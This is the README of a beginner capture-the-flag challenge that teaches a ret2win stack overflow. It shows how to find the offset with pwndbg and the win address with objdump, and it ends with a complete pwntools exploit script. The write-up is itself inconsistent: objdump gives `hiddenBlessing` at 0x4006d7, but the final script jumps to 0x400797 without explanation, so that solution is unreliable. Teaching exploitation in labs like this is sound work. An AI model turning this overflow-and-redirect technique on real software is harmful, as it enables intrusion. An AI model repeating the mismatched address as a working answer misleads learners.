# Challenge Name
kidr2w

## Learning Objective
Extended from BOF. Learn to find and rewrite return address to another function

## Description 
We want to win! But... how to win?

## Difficulty:
Guided (easy)

## Guide
In the code, 
1. `enlightenment` function has a vulnerable `gets` function.
2. `hiddenBlessing` function contains the flag.

We want to perform ret2win in this case.

#### What we need to do:
1. Find the exact offset before it overflows
2. Find return address of `hiddenBlessing` address

#### To find the offset needed:
1. use `cyclic 200` in pwndbg (this generates the de bruijn sequence)
2. `break main` and run the program (C)
3. you should see that the `RSP` pointer contains `raaaaaaa` and beyond. We just need the first 8 bytes because that is where the return address.

```shell
pwndbg> cyclic -l raaaaaaa
Finding cyclic pattern of 8 bytes: b'raaaaaaa' (hex: 0x7261616161616161)
Found at offset 136
```

#### To find the win address:
```shell
$> objdump -d chall | grep hiddenBlessing
00000000004006d7 <hiddenBlessing>:
...
```

#### How do we place inputs for the options then?
You can do the following so that it sends what you want after the binary output:
```python
input = b"abc\n"
p.sendafter("binary output", input)
```

With that knowledge, we can put our solve script together!

#### Final Solution
```python
from pwn import *

# local solve
p = process("./chall")

# remote
# p = remote("IP", PORT)

# hiddenBlessing function
win = p64(0x400797) + b'\n'

# Choose option first to enlightenment function
p.sendlineafter("purpose: \n", b'2')

# send payload after sendting option
payload = b'A' * 136  
payload += win        
p.sendafter("know? \n", payload)

p.interactive()
```

## Solution
Refer to solve.py

## Hints
1. which part of the code has a vulnerable C function?
2. check out sendafter: https://gist.github.com/zafirr31/bc37cacae5540d865de164f9ea16b679

## Attached Files
- chall.c
- chall

## Resources
- https://ir0nstone.gitbook.io/notes/binexp/stack/ret2win
- https://gist.github.com/zafirr31/bc37cacae5540d865de164f9ea16b679
- https://docs.pwntools.com/en/dev/tubes.html


## Flag
TBD